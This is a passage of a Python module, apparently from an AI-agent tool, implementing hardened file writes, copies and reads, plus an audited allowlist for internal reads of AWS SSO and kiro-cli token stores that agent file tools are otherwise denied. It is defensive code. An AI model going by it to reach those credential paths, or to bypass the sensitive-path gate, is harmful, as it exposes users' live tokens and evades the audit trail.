    # ATOMIC REPLACE, never truncate-then-write. Truncating first means a write
    # that fails partway (ENOSPC, EIO, EDQUOT) leaves the user's file empty or
    # half-written with no way back. Stage the complete payload beside the target
    # and rename over it: the rename is atomic, so the file is either the old
    # bytes or all of the new ones.
    #
    # The staging + rename are DIRECTORY-FD RELATIVE. Doing them by name would
    # hand back the check-to-use window the O_NOFOLLOW open just closed -- the
    # parent could be swapped for a symlink between the checks above and the
    # rename. The directory fd is opened O_NOFOLLOW and re-verified, and both
    # halves of the rename resolve against it.
    parent, base = os.path.split(path)
    # A UNIQUE staging name, created with O_EXCL. A predictable sibling could
    # already exist as real user data, and O_CREAT|O_TRUNC would have destroyed
    # it and then renamed it away. O_EXCL also means we only ever clean up a file
    # this call created.
    tmp_name = f".{base}.kirocrew-{os.getpid()}-{uuid.uuid4().hex}.tmp"
    # Directory-fd pinning is an ENHANCEMENT, not a precondition. Where the POSIX
    # APIs exist (Linux) the staging and rename resolve against an open handle on
    # the parent, so an ancestor swapped mid-save cannot redirect the write. Where
    # they do not (Windows), the same staged payload is renamed BY NAME instead --
    # which is exactly what every editor's atomic save does, and is what actually
    # protects the user's data: the file is either the old bytes or all of the new
    # ones, never a shredded half-write.
    #
    # This used to fail closed without the pinned variant. That made the whole
    # mirror-back feature Linux-only in order to defend against someone renaming
    # directories inside your project during the milliseconds of a save, on your
    # own machine, to a file you explicitly asked us to link. Losing the feature
    # on two platforms was the larger harm.
    #
    # Use getattr for O_DIRECTORY: a bare os.O_DIRECTORY raises AttributeError,
    # which `except OSError` would NOT catch, surfacing as a 500.
    # NOTE: the capability probe names os.rename, not os.replace. CPython lists
    # only os.rename in supports_dir_fd even though os.replace accepts the same
    # arguments -- probing os.replace silently disables pinning on Linux.
    o_directory = getattr(os, "O_DIRECTORY", 0)
    use_dir_fd = bool(
        o_directory
        and os.open in getattr(os, "supports_dir_fd", set())
        and os.rename in getattr(os, "supports_dir_fd", set())
    )

    # Extended attributes are read from the DESCRIPTOR, not the pathname, and read
    # HERE while it is still open. A by-name `listxattr(path)` re-resolves the
    # whole path, so an ancestor renamed mid-save makes the lookup fail while the
    # pinned rename below still succeeds -- installing a replacement stripped of
    # the owner's ACL. Everything else in this function is descriptor-pinned; this
    # was the one read that was not.
    #
    # A filesystem that does not support xattrs at all is NOT an error: there is
    # nothing on the source to lose. Any OTHER failure means we cannot know what
    # we would be dropping, so it refuses.
    #
    # `_should_carry_xattr` narrows this to the attributes an inode-replacing
    # write may reproduce, and it is applied HERE, at the read, so a
    # privilege-bearing `security.capability` or an integrity signature over the
    # OLD bytes (`security.ima`/`security.evm`) is never captured to be replayed
    # onto content the caller supplied. See its allowlist in atomic_write.py.
    src_xattrs: list[tuple[str, bytes]] = []
    if all(hasattr(os, a) for a in ("listxattr", "getxattr", "setxattr")):
        try:
            for _attr in os.listxattr(fd):
                if not _should_carry_xattr(_attr):
                    continue
                src_xattrs.append((_attr, os.getxattr(fd, _attr)))
        except OSError as exc:
            if exc.errno not in _XATTR_UNSUPPORTED_ERRNOS:
                logger.warning(
                    "refusing source write to %r: could not read its extended attributes "
                    "(%s), so a replacement could silently drop access controls",
                    path,
                    exc,
                )
                try:
                    os.close(fd)
                except OSError:
                    pass
                return "refused"
            src_xattrs = []

    # POSIX: the descriptor's job is done -- the staged rename below is pinned by
    # the directory fd instead, and holding a second handle buys nothing.
    try:
        os.close(fd)
    except OSError:
        pass

    dfd = -1
    created = False
    try:
        if use_dir_fd:
            try:
                dfd = os.open(parent, os.O_RDONLY | o_directory | getattr(os, "O_NOFOLLOW", 0))
            except OSError:
                return "refused"
        if use_dir_fd and within_root is not None:
            dir_real = _fd_real_path(dfd)
            if dir_real is None:
                return "refused"  # cannot verify containment -> fail closed
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([dir_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained or is_sensitive_path(dir_real):
                return "refused"
        elif within_root is not None:
            # No directory handle to interrogate, so the parent is verified by
            # its resolved path. Weaker than the pinned check (a swap between
            # this and the rename is not detectable) but it still refuses a
            # parent outside the authorised root or inside a sensitive location.
            dir_real = os.path.realpath(parent)
            root_real = os.path.realpath(within_root)
            try:
                contained = os.path.commonpath([dir_real, root_real]) == root_real
            except ValueError:
                contained = False
            if not contained or is_sensitive_path(dir_real):
                return "refused"
        # O_NOFOLLOW guards only the FINAL component, so opening the parent by
        # name leaves an INTERMEDIATE ancestor swappable between the file's
        # validation and this open: /project/a/c/doc with `a` replaced by a
        # symlink to /project/b yields a directory fd for a different `c`, and
        # the rename would overwrite /project/b/c/doc instead. Re-resolving
        # `base` through the pinned fd and requiring the SAME (dev, ino) closes
        # that: if any ancestor changed, this resolves to a different inode or
        # not at all.
        if use_dir_fd:
            try:
                dst = os.stat(base, dir_fd=dfd, follow_symlinks=False)
            except OSError:
                return "refused"
            if (dst.st_dev, dst.st_ino) != src_ident:
                logger.warning(
                    "refusing source write to %r: the pinned parent no longer resolves to "
                    "the validated file",
                    path,
                )
                # "refused" in BOTH modes: this predicate is the ancestor-swap
                # security guard (see the comment above), and auditing a
                # hostile swap under the benign concurrent-save code would
                # blind the SEL trail. The two post-staging re-checks below
                # own the benign-concurrency vocabulary.
                return "refused"
            tfd = os.open(
                tmp_name,
                os.O_WRONLY
                | os.O_CREAT
                | os.O_EXCL
                | getattr(os, "O_NOFOLLOW", 0)
                | getattr(os, "O_BINARY", 0),
                0o600,
                dir_fd=dfd,
            )
        else:
            tfd = os.open(
                os.path.join(parent, tmp_name),
                os.O_WRONLY
                | os.O_CREAT
                | os.O_EXCL
                | getattr(os, "O_NOFOLLOW", 0)
                | getattr(os, "O_BINARY", 0),
                0o600,
            )
        created = True
        try:
            written = 0
            while written < len(encoded):
                written += os.write(tfd, encoded[written:])
            # Restore the target's permissions on the descriptor BEFORE the
            # rename, so the replacement is never briefly visible as 0600.
            # Via platform_compat: os.fchmod does not exist on Windows, and a
            # bare call would raise AttributeError -- which `except OSError`
            # would NOT catch, surfacing as a 500 mid-update.
            platform_compat.fchmod_safe(tfd, src_mode)
            # Carry extended attributes across the replace. The in-place write
            # this replaced preserved them for free by never changing the inode;
            # a fresh inode starts with none, which silently drops POSIX ACLs
            # (stored as system.posix_acl_access) and any user.* metadata.
            #
            # Split by what the attribute DOES, rather than one policy for all.
            # `src_xattrs` is already narrowed to the carriable allowlist at the
            # read above, so the split below is only over POSIX ACLs and `user.*`:
            #
            #  * an ACCESS-CONTROL attribute that fails to copy is a security
            #    regression -- the rename would install an inode the owner has
            #    protected less than the one it replaced -- so the write is
            #    REFUSED and the original is left untouched;
            #  * an informational `user.*` attribute is best effort, because
            #    failing closed there would make every linked write fail on a
            #    filesystem that simply does not support xattrs (tmpfs, several
            #    network mounts), which is worse than losing a tag.
            #
            # A source with NO xattrs needs nothing carried, so an unsupported
            # filesystem is not an error -- there is nothing to lose.
            #
            # Values were captured from the validated DESCRIPTOR above, so this
            # loop cannot be affected by a path that moved since.
            for attr, value in src_xattrs:
                try:
                    os.setxattr(tfd, attr, value)
                except OSError:
                    if _is_access_control_xattr(attr):
                        logger.warning(
                            "refusing source write to %r: could not carry access-control "
                            "attribute %r onto the replacement",
                            path,
                            attr,
                        )
                        return "refused"
                    continue  # informational attribute -- keep going
            os.fsync(tfd)
        finally:
            os.close(tfd)
        # LAST-MOMENT re-check, immediately before the rename.
        #
        # rename() replaces whatever the name points at RIGHT NOW, and the
        # earlier identity check ran before the payload was staged -- a write
        # plus fsync, which on a slow filesystem is a wide window. An editor
        # doing its own atomic save in that window swaps in a NEW inode, and the
        # rename would silently overwrite content newer than what the user is
        # editing here. Re-checking last shrinks the window from "duration of
        # the staged write" to the few instructions below, and a detected change
        # REFUSES rather than clobbers.
        #
        # This is a narrowing, not a guarantee: a genuine compare-and-swap
        # rename needs renameat2(RENAME_EXCHANGE), which the stdlib does not
        # expose (and which is Linux-only). The remaining window cannot be
        # closed with os.rename, so the caller keeps its own snapshot and the
        # user's newer file wins -- the safe direction.
        try:
            pre = (
                os.stat(base, dir_fd=dfd, follow_symlinks=False)
                if use_dir_fd
                else os.stat(path, follow_symlinks=False)
            )
        except OSError:
            return "refused"
        if (pre.st_dev, pre.st_ino) != src_ident:
            logger.warning(
                "refusing source write to %r: the file changed on disk after validation "
                "(concurrent save); not overwriting the newer content",
                path,
            )
            return "conflict" if base_hash is not None else "refused"
        if src_state is not None and (pre.st_mtime_ns, pre.st_size) != src_state:
            # Same inode, different content: an IN-PLACE write landed after the
            # descriptor-anchored verify. The identity check above cannot see
            # it, but a changed mtime or size can — a narrowing on filesystems
            # with coarse timestamps, never a widening, and the failure
            # direction is the safe one: the newer file wins.
            logger.warning(
                "refusing verified replace of %r: the file was rewritten in place "
                "after its base hash was verified (concurrent save)",
                path,
            )
            return "conflict"
        if use_dir_fd:
            os.rename(tmp_name, base, src_dir_fd=dfd, dst_dir_fd=dfd)
        else:
            # os.replace, not os.rename: on Windows rename REFUSES an existing
            # destination, while replace overwrites it -- and does so atomically,
            # which is the property that matters here.
            os.replace(os.path.join(parent, tmp_name), path)
        created = False  # renamed away; nothing left to clean up
        return "ok"
    except OSError:
        return "refused"
    finally:
        if created:
            try:
                if dfd >= 0:
                    os.unlink(tmp_name, dir_fd=dfd)
                else:
                    os.unlink(os.path.join(parent, tmp_name))
            except OSError:
                pass
        if dfd >= 0:
            try:
                os.close(dfd)
            except OSError:
                pass


def safe_write_file_nolink(
    raw: str,
    content: str,
    within_root: str | None = None,
) -> bool:
    """Overwrite an EXISTING regular file, pinned to the descriptor opened.

    The no-verification entry point of :func:`_pinned_replace`; see there for
    the full contract. Returns True when the bytes were written, False on any
    rejection.
    """
    return _pinned_replace(raw, content, within_root=within_root) == "ok"


def verified_replace_file_nolink(
    raw: str,
    content: str,
    base_hash: str,
    *,
    max_bytes: int,
    within_root: str | None = None,
) -> str:
    """Compare-and-swap replace: verify *base_hash*, then atomically install.

    One ``O_NOFOLLOW`` open anchors everything — validation, the sha256 of the
    current bytes, metadata capture, and (via the pinned directory descriptor)
    the staged rename — so verification and replacement share one name
    resolution instead of a by-name read followed by an independent by-name
    write. Concurrency changes detected at any point after verification
    (identity swap, or an in-place rewrite visible through mtime/size) answer
    ``"conflict"`` rather than overwriting: the newer file wins, never the
    stale edit. Returns ``"ok"``, ``"conflict"``, ``"too_large"`` (the file
    outgrew *max_bytes* since the base was read), or ``"refused"``.
    """
    # Deny-by-default (AUTOSDE backend-security-controls): a verifying
    # primitive that accepts an unverifiable base and proceeds anyway has the
    # wrong contract regardless of caller. An explicit check, not an assert —
    # asserts vanish under ``python -O``, and the falsy value would silently
    # SKIP verification rather than refuse (fail-open, the exact lost-update
    # class this primitive exists to close).
    if not isinstance(base_hash, str) or not re.fullmatch(r"[0-9a-f]{64}", base_hash):
        return "refused"
    return _pinned_replace(
        raw, content, within_root=within_root, base_hash=base_hash, max_bytes=max_bytes
    )


def safe_copy_file_nolink(raw: str, dest_dir: str) -> str | None:
    """Copy a file into *dest_dir* with the full descriptor-pinned validation
    chain; return the private copy's path, or None if the source is rejected.

    For large binaries (media files) that libraries must consume BY PATH from
    a subprocess: the bytes are streamed from the vetted descriptor into a
    freshly created 0600 temp file inside *dest_dir*, so downstream readers
    never touch the caller-influenced original path again.

    Validation mirrors :func:`safe_read_file_bytes_nolink`: open first
    (``O_NOFOLLOW``), then ``fstat()`` on the descriptor (regular file,
    ``st_nlink == 1``), then the OPENED descriptor's real path (via
    ``/proc/self/fd`` on Linux, ``fcntl.F_GETPATH`` on macOS) must not be
    sensitive. ``O_NOFOLLOW`` only guards the FINAL path component — an
    ancestor directory swapped for a symlink between validation and open
    would otherwise reach a sensitive file. The fd-path check is pinned to
    the inode actually opened and copied, so no check-to-use window remains.
    If the fd's real path cannot be determined, fail closed.
    """
    path = validate_file_path(raw)
    if path is None:
        return None

    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    tmp_fd = -1
    tmp_path: str | None = None
    try:
        st = os.fstat(fd)
        if st.st_nlink > 1 or not _stat.S_ISREG(st.st_mode):
            return None
        fd_real = _fd_real_path(fd)
        if fd_real is None:
            return None  # cannot verify what was opened -> fail closed
        if is_sensitive_path(fd_real):
            return None
        tmp_fd, tmp_path = tempfile.mkstemp(
            prefix=".safe-copy-", suffix=os.path.splitext(fd_real)[1], dir=dest_dir
        )
        while True:
            chunk = os.read(fd, 1 << 20)
            if not chunk:
                break
            view = memoryview(chunk)
            while view:
                written = os.write(tmp_fd, view)
                view = view[written:]
        return tmp_path
    except OSError:
        if tmp_path is not None:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass
        return None
    finally:
        try:
            os.close(fd)
        except OSError:
            pass
        if tmp_fd >= 0:
            try:
                os.close(tmp_fd)
            except OSError:
                pass


def safe_read_prefix(raw: str, n: int) -> bytes | None:
    """Read the first *n* bytes of a file through is_sensitive_path enforcement.

    Like :func:`safe_read_file_bytes` but reads only a bounded prefix, for
    magic-byte / format sniffing of large binaries that exceed
    ``MAX_FILE_BYTES`` (e.g. the ~100 MB kiro-cli binary). ``validate_file_path``
    canonicalizes via ``realpath`` (following symlinks) and rejects sensitive
    resolved targets, so a symlink pointing into ``~/.aws`` etc. is refused
    before any read. The open uses ``O_NOFOLLOW`` on the canonical path as
    TOCTOU defense against a final-component symlink swap after the check.

    Returns up to *n* bytes, or None if the path is rejected or unreadable.
    """
    if n <= 0:
        return b""
    path = validate_file_path(raw)
    if path is None:
        return None
    try:
        fd = os.open(path, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except OSError:
        return None
    try:
        with os.fdopen(fd, "rb") as fh:
            return fh.read(n)
    except OSError:
        return None


# ---------------------------------------------------------------------------
# Internal authorized reads of sensitive paths
# ---------------------------------------------------------------------------
#
# The default ``safe_read_file`` / ``safe_read_file_bytes`` paths refuse any
# path that ``is_sensitive_path`` flags. A small set of **internal system**
# operations legitimately need to read a file ``is_sensitive_path`` blocks.
# Rather than have those callers reach for ``Path.read_bytes`` directly --
# which would scatter sensitive-path reads across the codebase and make the
# audit story ad-hoc -- they go through ``safe_read_file_internal(read_id)``,
# which consults this hardcoded allowlist, performs the read, and emits an SEL
# audit event on every outcome.
#
# Adding a new entry is a security-review event: it widens the set of sensitive
# reads that can happen outside the deny rule. Each entry's comment must justify
# why the read is system infrastructure (the bytes leaving the process never
# reach an LLM/agent surface) rather than LLM/agent-mediated content.
#
# The `backend-security-controls` rule requires reads of
# "user- or LLM-influenced paths" to pass is_sensitive_path() and explicitly
# EXEMPTS "trusted fixed-path internal ... reads". Every read_id here maps to a
# HARDCODED constant path (never derived from user/LLM/config input), the read
# is SEL-audited on every outcome and fail-closed (a success whose audit cannot
# be persisted returns None), the open is O_NOFOLLOW + fstat, and the target
# stores are themselves classified sensitive in security._SENSITIVE_HOME_DIRS
# so agent file tools cannot reach them. This is the sanctioned fixed-path
# internal case the rule exempts, not a weakening of the keystone.
_INTERNAL_READ_ALLOWLIST: dict[str, str] = {
    # ``kiro_crew.dashboard.handlers.kiro_usage_api`` reads the kiro-cli SSO
    # access token to authenticate a single ``GetUsageLimits`` call to the
    # hardcoded CodeWhisperer RTS endpoint
    # (``codewhisperer.us-east-1.amazonaws.com``) that powers the dashboard
    # credit-usage pill -- the same API the Kiro IDE credit meter uses. The
    # token bytes go only to that AWS endpoint over TLS; only the parsed numeric
    # usage dict returns to the process, and it is run through
    # ``redact_credentials``/``redact_exfiltration_urls`` before caching, so the
    # credential never reaches an LLM/agent surface. The operator already
    # trusted KiroCrew with the session by running ``kiro-cli login`` outside
    # any agent loop. (On Linux the live token lives in the kiro-cli SQLite
    # store, which is not a sensitive path; these JSON entries cover the IDE /
    # older kiro-cli cache layout.)
    "kiro_usage_api.sso_token_cli": ".aws/sso/cache/kiro-auth-token-cli.json",
    "kiro_usage_api.sso_token_ide": ".aws/sso/cache/kiro-auth-token.json",
}


def register_internal_read_path(read_id: str, rel_path: str) -> None:
    """Register an edition-contributed fixed-path internal-read carve-out.

    The composition-time seam an edition companion uses to add its own trusted
    fixed-path reads (e.g. an SSO cookie jar for the usage-upload path) to
    ``_INTERNAL_READ_ALLOWLIST`` — the exact structural twin of the boot-time
    ``register_acp_backends`` / ``register_publish_providers`` seams.  This is
    NOT an agent-reachable API: it is called once, from the companion's boot
    composition, with HARDCODED constant arguments.  It never widens what
    ``safe_read_file_internal`` will read at call time — that function still
    re-verifies the resolved path is sensitive, opens O_NOFOLLOW, and SEL-audits
    every outcome — this only lets an edition contribute an entry to the same
    guarded table the core ships.

    Guards (fail-closed, so a mis-registration cannot open a hole):

    * ``read_id`` must be a non-empty string; re-registering an existing key with
      a DIFFERENT path raises (a companion cannot silently repoint a core entry
      such as ``kiro_usage_api.sso_token_cli`` at an attacker file).  Re-
      registering the same key with the same path is idempotent.
    * ``rel_path`` must be a relative path with no ``..`` component and no
      absolute/anchor part, so the resolved target can only ever live under
      ``~`` (the read still resolves under ``Path.home()`` at call time).
    * the resolved ``~/<rel_path>`` must already be classified sensitive by
      :func:`kiro_crew.security.is_sensitive_path` — the carve-out is only valid
      for a path the shared file gate otherwise blocks; registering a
      non-sensitive path is a configuration error and raises.
    """
    if not isinstance(read_id, str) or not read_id:
        raise ValueError("register_internal_read_path: read_id must be a non-empty string")
    existing = _INTERNAL_READ_ALLOWLIST.get(read_id)
    if existing is not None and existing != rel_path:
        raise ValueError(
            f"register_internal_read_path: {read_id!r} already registered to a "
            f"different path {existing!r}; refusing to repoint",
        )
    p = Path(rel_path)
    if p.is_absolute() or p.anchor or ".." in p.parts:
        raise ValueError(
            f"register_internal_read_path: rel_path must be relative with no '..' "
            f"(got {rel_path!r})",
        )
    resolved = str((Path.home() / p).expanduser())
    if not is_sensitive_path(resolved):
        raise ValueError(
            f"register_internal_read_path: {rel_path!r} resolves to a non-sensitive "
            f"path; the carve-out is only valid for a sensitive path",
        )
    _INTERNAL_READ_ALLOWLIST[read_id] = rel_path


def safe_read_file_internal(read_id: str) -> bytes | None:
    """Read a sensitive path on behalf of an authorized internal caller.

    The ``read_id`` must be a key in ``_INTERNAL_READ_ALLOWLIST``. The
    function resolves the allowlisted path under ``~``, verifies it is in fact
    sensitive (defense in depth), reads the bytes (subject to
    ``MAX_FILE_BYTES``), emits an SEL audit event on every outcome, and returns
    the bytes -- or ``None`` if missing / unreadable / oversized.

    Raises ``PermissionError`` if ``read_id`` is not allowlisted -- callers must
    never construct ``read_id`` from untrusted input.

    Fail-closed audit: if the SEL audit for the ``success`` outcome cannot be
    recorded (backend unavailable, or the emit raised), the function returns
    ``None`` instead of the bytes -- a ``logger.warning`` is not itself an SEL
    audit event, and the carve-out's validity depends on every successful read
    producing a real audit. Callers already handle ``None`` (degrade to the
    text scrape).
    """
    if read_id not in _INTERNAL_READ_ALLOWLIST:
        _emit_internal_read_audit(read_id, "not_allowlisted")
        raise PermissionError(
            f"safe_read_file_internal denied: {read_id!r} not in allowlist",
        )

    rel_path = _INTERNAL_READ_ALLOWLIST[read_id]
    abs_path = Path.home() / rel_path
    resolved = str(abs_path.expanduser())

    # Defense in depth: the allowlist is only a meaningful carve-out if the
    # underlying path is in fact sensitive. If it has stopped being sensitive,
    # the carve-out has nothing to protect against and the configuration has
    # drifted; refuse rather than silently widen access.
    if not is_sensitive_path(resolved):
        _emit_internal_read_audit(read_id, "not_sensitive")
        raise PermissionError(
            f"safe_read_file_internal denied: {read_id!r} resolves to a "
            f"non-sensitive path; allowlist is only valid for sensitive paths",
        )

    # Open with O_NOFOLLOW so a symlink at the final path component (e.g. a
    # planted ~/.aws/sso/cache/kiro-auth-token-cli.json -> attacker file) is
    # refused, binding the read to the real allowlisted file rather than a
    # redirected target. Check + read share ONE descriptor (TOCTOU-safe), and
    # fstat confirms a regular file before reading.
    import stat

    try:
        fd = os.open(resolved, os.O_RDONLY | getattr(os, "O_NOFOLLOW", 0))
    except FileNotFoundError:
        _emit_internal_read_audit(read_id, "missing")
        return None
    except OSError:
        # ELOOP (final component is a symlink) and any other open error —
        # fail closed, never following the link.
        _emit_internal_read_audit(read_id, "unreadable")
        return None

    data = b""
    try:
        st = os.fstat(fd)
        if not stat.S_ISREG(st.st_mode):
            _emit_internal_read_audit(read_id, "not_regular")
            return None
        with os.fdopen(fd, "rb", closefd=True) as fh:
            fd = -1  # ownership transferred to fh; do not double-close
            data = fh.read(MAX_FILE_BYTES + 1)
    except OSError:
        _emit_internal_read_audit(read_id, "unreadable")
        return None
    finally:
        if fd != -1:
            try:
                os.close(fd)
            except OSError:
                pass

    if len(data) > MAX_FILE_BYTES:
        _emit_internal_read_audit(read_id, "too_large")
        return None

    if not _emit_internal_read_audit(read_id, "success"):
        logger.error(
            "Denying sensitive read %s: SEL audit unavailable; the carve-out "
            "requires an audit trail and the caller will see None instead of "
            "the file bytes.",
            read_id,
        )
        return None
    return data


def _emit_internal_read_audit(read_id: str, outcome: str) -> bool:
    """Emit an SEL audit event for an internal sensitive/credential read.

    Returns ``True`` iff an SEL event was recorded, ``False`` otherwise (SEL
    backend unavailable or the emit raised). ``safe_read_file_internal`` /
    ``emit_internal_read_audit`` gate the return of sensitive bytes on this
    result for ``success`` outcomes: a ``logger.warning`` is NOT itself an SEL
    audit event, so a read whose audit could not be recorded must be denied.
    """
    try:
        from kiro_crew.sel import sel
    except ImportError:  # pragma: no cover - sel optional in some test envs
        logger.warning(
            "SEL backend unavailable; internal-read audit dropped " "for read_id=%s outcome=%s",
            read_id,
            outcome,
        )
        return False
    try:
        sel().log_tool_invocation(
            session_key="hooks:safe_read_file_internal",
            tool_name=f"internal_read.{read_id}",
            outcome=outcome,
            source="hooks",
            # audit-or-deny: a "success" gates the return of live credential
            # bytes, so it must be written SYNCHRONOUSLY (critical=True drains the
            # queue and re-raises on a filesystem failure). In async SEL mode a
            # non-critical log() only ENQUEUES — a later writer-thread failure is
            # swallowed and this would wrongly return True for an audit that
            # never landed. Non-success outcomes already return None / raise, so
            # a dropped event there still leaves an observable log line.
            critical=(outcome == "success"),
        )
    except Exception:  # noqa: BLE001 - audit must never break the caller
        logger.warning(
            "SEL audit emission failed for internal read read_id=%s",
            read_id,
            exc_info=True,
        )
        return False
    return True


# Registry of sanctioned audit-only credential accesses: read_id -> the
# credential-bearing location it covers. Both classes below owe the same SEL
# audit trail as ``_INTERNAL_READ_ALLOWLIST``, and neither can route through
# ``safe_read_file_internal`` -- which returns the CONTENT of a FIXED sensitive
# path:
#
#   1. A live secret at a path that is NOT classified sensitive, so the
#      sensitive-path gate does not apply to it at all.
#   2. A presence-only access under a classified directory at a per-subject
#      COMPUTED name: there is no content to return and no fixed relative path
#      to register, so the gate has nothing to act on -- but the access is still
#      first-party contact with a credential store and still owes a trail.
#
# Every entry requires the same security-review justification discipline as
# ``_INTERNAL_READ_ALLOWLIST``.
_AUDIT_ONLY_READ_IDS: dict[str, str] = {
    # kiro-cli / amazon-q SQLite auth stores: live SSO bearer token on Linux.
    # Read read-only by ``kiro_crew.dashboard.handlers.kiro_usage_api`` for the
    # single hardcoded GetUsageLimits call (see the kiro_usage_api.sso_token_*
    # justification in _INTERNAL_READ_ALLOWLIST -- identical posture, different
    # storage layout).
    "kiro_usage_api.sqlite_token": ".local/share/{kiro-cli,amazon-q}/data.sqlite3",
    # Same store, read by ``kiro_crew.kiro_cli.signed_in_via_idc`` to answer one
    # question for the enterprise MCP-governance diagnostic: did this identity come
    # from Identity Center? Only the two non-secret ``auth.idc.*`` marker rows are
    # selected, and only their COUNT leaves the function -- no token row is read and
    # no value is returned. The audit is owed regardless, because the file holds
    # live credential material whatever this reader touches.
    "kiro_cli.idc_identity_probe": ".local/share/kiro-cli/data.sqlite3",
    # Same store, read by ``kiro_crew.kiro_prerequisite.identity_fingerprint`` to
    # answer one question on the turn path: does the account signed in NOW differ
    # from the one the running kiro-cli children loaded? Only stable account
    # claims participate (start_url, region, oauth_flow, scopes, client_id) plus
    # the non-secret ``auth.*`` / ``api.codewhisperer.*`` marker rows; the values
    # are hashed and only a digest leaves the function. The rotating and secret
    # fields (access_token, refresh_token, expires_at, client_secret) are excluded
    # by an ALLOWLIST, so a field added to the blob later cannot join by default.
    # Audited on the observation a caller acts on rather than per poll -- the
    # reader holds a short cache -- for the same reason as the mint entry below.
    "kiro_prerequisite.identity_fingerprint": ".local/share/kiro-cli/data.sqlite3",
    # Class 2. kiro-cli's MCP OAuth artifact cache under ``~/.aws/sso/cache``.
    # ``kiro_crew.mcp_grant.grant_present`` STATS the paired
    # ``<sha256(mcp_url)>.token.json`` / ``.registration.json`` artifacts to learn
    # whether kiro-cli already holds a grant for ONE endpoint. The files are never
    # opened, so no token material can enter the process.
    #
    # TWO callers, and the second is the wider one: the mint's consent-completion
    # signal (curated registry providers only), and ``mcp_discovery``'s remote
    # probe, which asks for ANY url the user configured whenever a probe meets an
    # OAuth challenge. So the reasoning cannot rest on the url being
    # registry-declared. What keeps it sound for arbitrary input is the key: the
    # name is a sha256 over the url's normalized origin and path, so no caller can
    # express a path outside this directory, name a file it did not derive, or
    # smuggle a credential from the url into the filename. The digest is also why
    # the widened caller set adds no read surface -- both callers can only ever
    # probe for the pair belonging to the url they already hold.
    #
    # Audited on the observation a caller acts on, not per poll, and the two
    # callers differ on which observations those are. The mint polls for a grant
    # to APPEAR, so only its TRUE is acted on and recorded. The probe reads once
    # and renders either answer -- an absent pair is what produces "Sign-in
    # required" -- so it opts into recording the negative too, as ``missing``.
    # See ``mcp_grant.grant_observed`` for why that boundary is not fail-closed,
    # and note that neither caller logs the url itself (the probe logs the server
    # name, the mint warning logs the key) because a user-supplied endpoint can
    # carry a credential in its userinfo or query string.
    "connections_mint.oauth_grant_presence": ".aws/sso/cache/<sha256(mcp_url)>.token.json",
    # Class 2, same artifacts and same posture as the mint entry above: the
    # status module (``kiro_crew.connections.status``) STATS the identical
    # paired grant artifacts to answer the dashboard's authorization question.
    # A separate id, not a reuse of the mint's, so the SEL trail says which
    # surface looked. Audited only on the acted-on observation -- the stamping
    # of a provider's first-connect timestamp -- never per poll sweep; see
    # ``status.reconcile_connected_since`` for why that boundary is
    # best-effort rather than fail-closed (stats only, no bytes returned).
    "connections_status.oauth_grant_presence": ".aws/sso/cache/<sha256(mcp_url)>.token.json",
    # Class 2, same artifacts and same posture again: the premint endpoint
    # (``dashboard.handlers.connections.api_connections_premint``) reaches the warm
    # engine's candidate scan, which STATS the paired grant artifacts for every
    # registry provider to decide which ones still need a URL minted.
    #
    # A separate id from the mint's and the status module's, so the trail names the
    # surface that looked. ONE event per activation rather than one per candidate:
    # the scan is a single pass whose N answers feed exactly one act decision (spawn
    # the shared warm process, or do not), so per-candidate events would over-count
    # one observation and, because this entry point marks its events critical, drain
    # the queue N times for a single page mount. Audited only when the endpoint ACTS
    # -- an empty candidate set returns early without spawning, persisting, or
    # reporting any grant answer, so a page mounted against a fully-authorized
    # gallery writes nothing. Best-effort rather than fail-closed for the same reason
    # as the two entries above (stats only, no bytes returned); see
    # ``api_connections_premint`` for why refusing would be the worse failure.
    "connections_premint.oauth_grant_presence": ".aws/sso/cache/<sha256(mcp_url)>.token.json",
}


def emit_internal_read_audit(read_id: str, outcome: str) -> bool:
    """Emit an SEL audit event for a credential read that cannot route through
    :func:`safe_read_file_internal`.

    ``safe_read_file_internal`` covers reads of *sensitive paths*. Some
    credential material lives at a path that is NOT classified sensitive yet
    still holds a live secret -- e.g. the kiro-cli auth store at
    ``~/.local/share/kiro-cli/data.sqlite3``. Such a reader still owes the same
    audit trail, so it calls this wrapper with its own ``read_id`` and outcome.
    A presence-only access under a classified directory at a computed name lands
    here for the mirror-image reason: there is no content to gate and no fixed
    path to register, but the contact with the credential store is real. See
    :data:`_AUDIT_ONLY_READ_IDS` for both classes.

    The ``read_id`` MUST be registered in ``_AUDIT_ONLY_READ_IDS`` -- this entry
    point enforces its own allowlist, mirroring the ``_INTERNAL_READ_ALLOWLIST``
    gate, so it cannot be used as an unscoped bypass of the SEL-audit surface.
    An unregistered ``read_id`` returns ``False`` without emitting, which
    callers treat as "audit unavailable" and fail closed on.
    """
    if read_id not in _AUDIT_ONLY_READ_IDS:
        logger.warning("emit_internal_read_audit: unregistered read_id %r rejected", read_id)
        return False
    return _emit_internal_read_audit(read_id, outcome)


# ── Script Hooks ──

# Inclusive bounds for a script hook's subprocess timeout, in seconds. Mirrors
# the API schema (``validation.HOOK_CREATE_SCHEMA`` min_val=1/max_val=300); kept
# here so the same bound is enforced at EVERY persistence boundary — create,
# update, and deserialization — not only when a value arrives over the dashboard
# API. A 0 (or negative) timeout makes ``asyncio.wait_for`` fire immediately, and
# an unbounded one lets a hook wedge a turn for as long as it likes; both are
# outcomes a hand-edited or older ``hooks.json`` could otherwise reintroduce.
HOOK_TIMEOUT_MIN = 1
HOOK_TIMEOUT_MAX = 300
HOOK_TIMEOUT_DEFAULT = 30

# Events on which a standalone skills-only hook (no command) actually fires: only
# UserPromptSubmit / AgentSpawn synthesize the "Load skills:" directive in
# ``ScriptHookStore.fire()``. On any other event the directive has no consumer,
# so pairing skills with one is a config that saves but never fires.
_SKILLS_ONLY_EVENTS = (HOOK_EVENT_USER_PROMPT_SUBMIT, HOOK_EVENT_AGENT_SPAWN)

# A global Python inline-flag directive at the very start of a pattern. Only this
# form replaces the matcher-wide case-insensitive default. Scoped forms such as
# ``(?i:...)`` and ``(?-i:...)`` govern their group only, so the caller still
# prepends ``(?i)`` for the rest of the expression.
_GLOBAL_INLINE_FLAGS_RE = re.compile(r"^\(\?[aiLmsux]+\)")


def _has_global_inline_flags(pattern: str) -> bool:
    """True when *pattern* starts with a global Python flag directive."""
